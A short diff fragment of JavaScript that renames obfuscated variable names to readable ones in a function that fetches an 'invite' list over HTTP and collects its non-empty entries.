   const _0x4ee00e = {
     "url": _0x180c0c,
     "headers": ''
   };
   await httpRequest("get", _0x4ee00e);
-  let _0xb50617 = httpResult;
+  let result = httpResult;
 
-  if (!_0xb50617) {
-    return _0x2c06d9;
+  if (!result) {
+    return flag;
   }
 
-  for (let _0x13e88c of _0xb50617["invite"]) {
-    if (_0x13e88c) {
-      _0x5718d8["push"](_0x13e88c);
+  for (let item of result["invite"]) {
+    if (item) {
+      inviteList["push"](item);
     }
   }
 
-  return _0x2c06d9;
+  return flag;
 }
 
 function populateUrlObject(url, cookie, body = '') {
